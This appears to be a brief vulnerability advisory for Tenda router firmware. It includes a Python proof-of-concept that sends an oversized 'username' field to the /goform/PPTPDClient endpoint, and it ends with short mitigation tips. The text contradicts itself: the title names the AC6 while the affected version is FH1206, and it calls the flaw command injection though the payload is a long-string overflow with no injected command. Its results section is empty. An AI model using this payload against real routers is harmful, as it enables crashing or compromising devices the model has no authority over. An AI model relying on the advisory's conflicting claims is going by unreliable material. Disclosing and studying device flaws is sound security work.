# Command Injection Vulnerability in Tenda AC6 Firmware



## Affected Versions
- Tenda FH1206 V02.03.01.35


## Proof of Concept (PoC)

```python
import requests

host_port = "http://192.168.101.50:8008"
url = "/goform/PPTPDClient"

data = {"username": "E"*1000, "flag": "0"}

response = requests.post(host_port + url, data=data)

# Print the response code and content
print("Response status code: ", response.status_code)
print("Response content: ", response.text)
```

### PoC Run Results:




## Mitigation
- Apply the latest firmware update from Tenda to address this issue.
- Ensure proper input validation and sanitization to prevent command injection attacks.

